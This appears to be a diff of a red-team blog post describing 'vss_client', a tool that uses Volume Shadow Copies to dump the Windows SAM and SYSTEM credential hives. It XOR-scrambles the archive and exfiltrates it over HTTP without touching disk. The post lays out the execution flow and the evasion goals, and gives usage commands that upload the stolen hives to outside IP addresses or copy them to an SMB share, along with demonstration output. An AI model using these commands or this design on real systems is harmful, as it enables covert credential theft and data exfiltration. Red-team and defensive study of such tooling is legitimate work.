@@ -1,4 +1,4 @@
----            
+---
 title: "A Volume Shadow Copy client that excels in dumping creds and getting away with it"    
 categories:
   - blog                
@@ -19,47 +19,102 @@ toc_sticky: true
 
 ## TL;DR
 
-A Volume Shadow Copy client that allows for easy dumping of SAM/SYSTEM hives, or any file for that matter, and covert data exfiltration to an HTTPS service, without touching disk.
+A small VSS client that:
+
+* Creates client-accessible Volume Shadow Copies on demand
+* Dumps `SAM` / `SYSTEM` (or any other files) from the snapshot
+* Bundles multiple files into a ZIP archive (optionally XOR-scrambled)
+* Exfiltrates archives directly over HTTP(S) via `--post`, **without writing the ZIP to disk**
 
 [vss_client on Github](https://github.com/0xvm/vss_client)
 
-## Description
+## Overview
 
-On a recent threat simulation we have been asked to create a custom app that behaves like a backup client, use it to dump/steal some local creds and get away with it, ideally raising no events. 
+On a recent threat simulation we were asked to create a custom app that behaves like a backup client, use it to dump/steal some local creds, and get away with it, ideally raising no events. `vss_client` is the result: a minimal Volume Shadow Copy client focused on quietly copying sensitive files or packaging and shipping them elsewhere.
 
-### Execution Flow
+**Note:** This tool assumes you already have high-privilege code execution on the target (local admin / SYSTEM). It does not provide an exploitation vector by itself.
+{: .notice--info}
 
-- Mode selection – sets singleCopy, multiCopy, or snapshotOnly. If no work is queued, snapshot-only mode implicitly keeps the snapshot unless --keep was passed.
+## Execution Flow
 
-- Privilege setup – calls EnableRequiredPrivileges() which in turn invokes EnablePrivilege for SE_BACKUP_NAME, SE_RESTORE_NAME, and SE_MANAGE_VOLUME_NAME; failure aborts immediately.
+1. **Mode selection**
 
-- COM/VSS init – CoInitializeEx, CoInitializeSecurity, CreateVssBackupComponents, InitializeForBackup, SetContext(VSS_CTX_CLIENT_ACCESSIBLE), and SetBackupState are called in sequence; bust on failure.
+   Selects one of:
 
-- Snapshot creation – StartSnapshotSet creates the set, 
--- AddToSnapshotSet adds C:\, 
--- DoSnapshotSet kicks off creation, a
--- the returned async object is waited on. 
+   * `singleCopy`
+   * `multiCopy`
+   * `snapshotOnly`
 
-- GetSnapshotProperties provides the snapshot device path. Any error along the way jumps to FailWithCleanup, which deletes the snapshot (unless --keep), frees VSS props, releases COM, and exits.
+   If no work is queued, snapshot-only mode implicitly keeps the snapshot.
 
-- (case) Single file copy path
--- NormalizeRelativePath cleans the user path; if it was already absolute (IsAbsoluteSnapshotPath), use it directly,
--- BuildSnapshotPath combines it with the snapshot root. 
--- The resulting full source is logged, CopyFileW to the destination runs, then success/failure is logged.
+2. **Privilege setup**
 
-- (case) Multi-file archive path 
--- each entry is checked to ensure it’s relative, normalized, verified to be an existing regular file, and converted to a ZIP entry name via MakeZipEntryName.
--- ZipWriter is opened either on disk (Open) or in-memory (OpenMemory) depending on whether --output or --post is used. 
--- Optional XOR streaming is enabled. If we don't enable XOR streaming this will be a vanilla zip file, no compression, just a container. An LCG-based XOR stream is implemented with an initial user provided seed. Given a large enough seed (this is an int()), although the result is deterministic and cryptographically insecure, it gets the job of producing a very random looking file very much.  
--- For each task, AddStoredFile reads and writes a stored ZIP entry; any failure logs the writer’s error, deletes the partially written archive with DeletePartialArchive, and exits via FailWithCleanup.
--- After all entries the archive is Finalized and Closed. 
-If --post was selected, UploadArchive streams the in-memory buffer over WinHTTP to `[endpoint]/upload`;
-IF --output was selected, the in-memory buffer is written to a blob on disk;
+   Calls `EnableRequiredPrivileges()`, which in turn invokes `EnablePrivilege` for:
 
-Cleanup – whether copy or archive, DeleteSnapshotIfNeeded removes the snapshot unless --keep. VSS props are freed, the components released, and [+] Completed successfully is printed before CoUninitialize returns control to the OS.
+   * `SE_BACKUP_NAME`
+   * `SE_RESTORE_NAME`
+   * `SE_MANAGE_VOLUME_NAME`
 
-[https-proxy in github](https://github.com/0xvm/https-proxy)
+3. **COM / VSS initialization**
 
+   The following APIs are executed in sequence:
+
+   * `CoInitializeEx`
+   * `CoInitializeSecurity`
+   * `CreateVssBackupComponents`
+   * `InitializeForBackup`
+   * `SetContext(VSS_CTX_CLIENT_ACCESSIBLE)`
+   * `SetBackupState`
+
+   Any failure in this stage causes an immediate bail.
+
+4. **Snapshot creation**
+
+   * `StartSnapshotSet` creates the snapshot set.
+   * `AddToSnapshotSet` adds `C:\` to that set.
+   * `DoSnapshotSet` kicks off snapshot creation and returns an async object which is then waited on.
+   * `GetSnapshotProperties` retrieves the snapshot device path.
+
+   Any error along the way jumps to `FailWithCleanup`, which deletes the snapshot (unless `--keep`), frees VSS props, releases COM, and exits.
+
+5. **Single file copy path**
+
+   When copying a single file:
+
+   * `NormalizeRelativePath` cleans the user-supplied path.
+   * If it was already absolute (`IsAbsoluteSnapshotPath`), it’s used directly.
+   * Otherwise, `BuildSnapshotPath` combines it with the snapshot root.
+
+   The resulting full source path is logged, `CopyFileW` copies it to the destination, and success/failure is logged.
+
+6. **Multi-file archive path**
+
+   When building an archive:
+
+   * Each entry is validated to ensure it is relative, normalized, an existing regular file, and then converted to a ZIP entry name via `MakeZipEntryName`.
+   * `ZipWriter` is opened either on disk (`Open`) or in-memory (`OpenMemory`) depending on whether `--output` or `--post` is used.
+   * Optional XOR streaming is enabled when `--xor-seed <seed>` is provided. If XOR is disabled, the result is a vanilla ZIP file (no compression, just a container). The XOR stream is LCG-based with a user-provided `int()` seed: deterministic and cryptographically weak, but producing very random-looking blobs.
+
+   For each task:
+
+   * `AddStoredFile` reads and writes a stored ZIP entry.
+   * Any failure logs the writer error, deletes the partially written archive with `DeletePartialArchive`, and exits via `FailWithCleanup`.
+
+   After all entries:
+
+   * The archive is **finalized** and **closed**.
+   * If `--post` was selected, `UploadArchive` streams the in-memory buffer over WinHTTP to `[endpoint]/upload`.
+   * If `--output` was selected, the in-memory buffer is written to a blob on disk.
+
+7. **Cleanup**
+
+   Regardless of path taken:
+
+   * `DeleteSnapshotIfNeeded` removes the snapshot unless `--keep`.
+   * VSS props are freed and the COM components released.
+   * `[+] Completed successfully` is printed before `CoUninitialize` returns control to the OS.
+
+## Usage
 
 ```
 C:\Users\user\Source\vss_client>vss_client.exe -h
@@ -72,38 +127,49 @@ Examples:
   vss_client.exe --files windows\\system32\\config\\sam windows\\system32\\config\\system --xor-seed 1337 --output C:\\loot.zip # if you need files in a blob locally 
   vss_client.exe --files windows\\system32\\config\\sam windows\\system32\\config\\system --xor-seed 1337 --post http://192.168.100.106:8000 # if you would like to upload remotely
 ```
+Running the executable with no arguments simply creates a client-accessible snapshot and prints the snapshot device path (the snapshot is retained so you can mount it manually). Copying a single file or building an archive deletes the snapshot by default unless `--keep` is provided.
+
+* `--output <archive.zip>` (with `--files`) writes the archive to disk.
+* `--xor-seed <seed>` enables an LCG-based XOR stream while the ZIP is being written (no second pass is needed anymore). An LCG-based XOR stream is used since minizip does not implement compression, hence a simple XOR would actually have your key in any `\x00\x00\x00\x00` series of bytes in the resulting blob.
+* `--post <url>` (HTTP/HTTPS) uploads the resulting archive directly from memory via a Chrome-like multipart/form-data POST (always to `/upload`); POST is customized for this server: [https://pypi.org/project/uploadserver/](https://pypi.org/project/uploadserver/) ; HTTPS certificates are not validated on purpose and no local ZIP is touching disk.
+
+**Warning:** HTTPS certificates are not validated on purpose, and the ZIP never touches disk locally. Use this only in lab / controlled environments.
+{: .notice--danger}
 
 ## Building
 
-Run `compile_vss_client.bat` from a Visual Studio Developer Command Prompt to produce `vss_client.exe` (the script now builds a size-oriented `/MD` release with LTCG, identical-code folding, and RTTI disabled by default). Pass `static` as the first argument to either `compile_vss_client.bat` or `compile_mount_vss.bat` if you need a static MSVC runtime build (`/MT`). Static builds are emitted as `vss_client-static.exe` and `mount_vss-static.exe`. 
+Run `compile_vss_client.bat` from a Visual Studio Developer Command Prompt to produce `vss_client.exe` (the script now builds a size-oriented `/MD` release with LTCG, identical-code folding, and RTTI disabled by default). Pass `static` as the first argument to either `compile_vss_client.bat` or `compile_mount_vss.bat` if you need a static MSVC runtime build (`/MT`). Static builds are emitted as `vss_client-static.exe` and `mount_vss-static.exe`.
 
-The repository layout is:
+### Repository layout
 
-- `src/`: all C++ translation units (client, helpers, mount tool).
-- `include/`: shared headers and platform definitions.
-- `compile_*.bat`: helper build scripts you can run from the repo root.
-- `scripts/`: helper tools like `unscramble.ps1` / `.py`.
+| Path            | Description                                         |
+| --------------- | --------------------------------------------------- |
+| `src/`          | C++ translation units (client, helpers, mount tool) |
+| `include/`      | Shared headers and platform definitions             |
+| `compile_*.bat` | Helper build scripts you can run from the repo root |
+| `scripts/`      | Helper tools like `unscramble.ps1` / `.py`          |
+
+### Modules
 
 Within `src/` the code is split into modules:
 
-- `vss_client.cpp`: CLI parsing and main workflow.
-- `privileges.*`: privilege elevation helpers.
-- `path_utils.*`: snapshot path normalization helpers.
-- `zip_writer.*`: minimal ZIP archive writer.
-- `snapshot_utils.*`: snapshot cleanup helpers.
-- `file_utils.*`: failure-time cleanup helpers for archives.
-- `upload_utils.*`: multipart uploader for `--post`.
-- `common.h`: shared Windows definitions and include set.
+| File               | Responsibility                             |
+| ------------------ | ------------------------------------------ |
+| `vss_client.cpp`   | CLI parsing and main workflow              |
+| `privileges.*`     | Privilege elevation helpers                |
+| `path_utils.*`     | Snapshot path normalization helpers        |
+| `zip_writer.*`     | Minimal ZIP archive writer                 |
+| `snapshot_utils.*` | Snapshot cleanup helpers                   |
+| `file_utils.*`     | Failure-time cleanup helpers for archives  |
+| `upload_utils.*`   | Multipart uploader for `--post`            |
+| `common.h`         | Shared Windows definitions and include set |
 
-Running the executable with no arguments now simply creates a client-accessible snapshot and prints the snapshot device path (the snapshot is retained so you can mount it manually). Copying a single file or building an archive deletes the snapshot by default unless `--keep` is provided.
+## Examples
 
-- `--output <archive.zip>` (with `--files`) writes the archive to disk.
-- `--xor-seed <seed>` enables an LCG-based XOR stream while the ZIP is being written (no second pass is needed anymore). An LCG-based XOR stream is used since minizip does not implement compression, hence a simple XOR would actually had your key in any \x00\x00\x00\x00 series of bytes in the resulting blob.
-- `--post <url>` (HTTP/HTTPS) uploads the resulting archive directly from memory via a Chrome-like multipart/form-data POST (always to `/upload`); POST is customized for this server: https://pypi.org/project/uploadserver/ ; HTTPS certificates are not validated on purpose and no local ZIP is touching disk.
+### Multi-file with POST
 
-The rest of this file shows the original demonstration run for reference.
+Demonstrates archiving `SAM` and `SYSTEM` into a ZIP, XOR-scrambling it with `--xor-seed`, and exfiltrating it over HTTP.
 
-## Multi file with POST
 ```
 C:\Users\user\Source\vss_client>vss_client.exe --files windows\\system32\\config\\sam windows\\system32\\config\\system --xor-seed 1337 --post http://10.10.10.2:8000
 [i] Will archive 2 file(s) and upload to 'http://10.10.10.2:8000' (XOR stream applied)
@@ -197,7 +263,10 @@ xxx
 🌊 ubuntu@ubuntu:/tmp/tmp > 
 ```
 
-## Single file to SMB share
+### Single file to SMB share
+
+Demonstrates copying a single file (`SYSTEM`) from the snapshot to an SMB share.
+
 ```
 C:\Users\user\Source\vss_client>.\vss_client.exe "\windows\system32\config\system" "\\10.10.10.2\share\system"
 [i] Will copy '\windows\system32\config\system' from snapshot to '\\10.10.10.2\share\system'
@@ -222,7 +291,10 @@ C:\Users\user\Source\vss_client>.\vss_client.exe "\windows\system32\config\syste
 [+] Completed successfully
 ```
 
-## Mount Shadow Volume
+### Mount shadow volume
+
+Demonstrates snapshot-only mode, mounting the snapshot as a drive letter, and then cleaning it up.
+
 ```
 C:\Users\user\Source\vss_client>vssadmin list shadows
 vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
@@ -274,3 +346,4 @@ Successfully deleted 1 shadow copies.
 
 C:\Users\user\Source\vss_client>
 ```
+
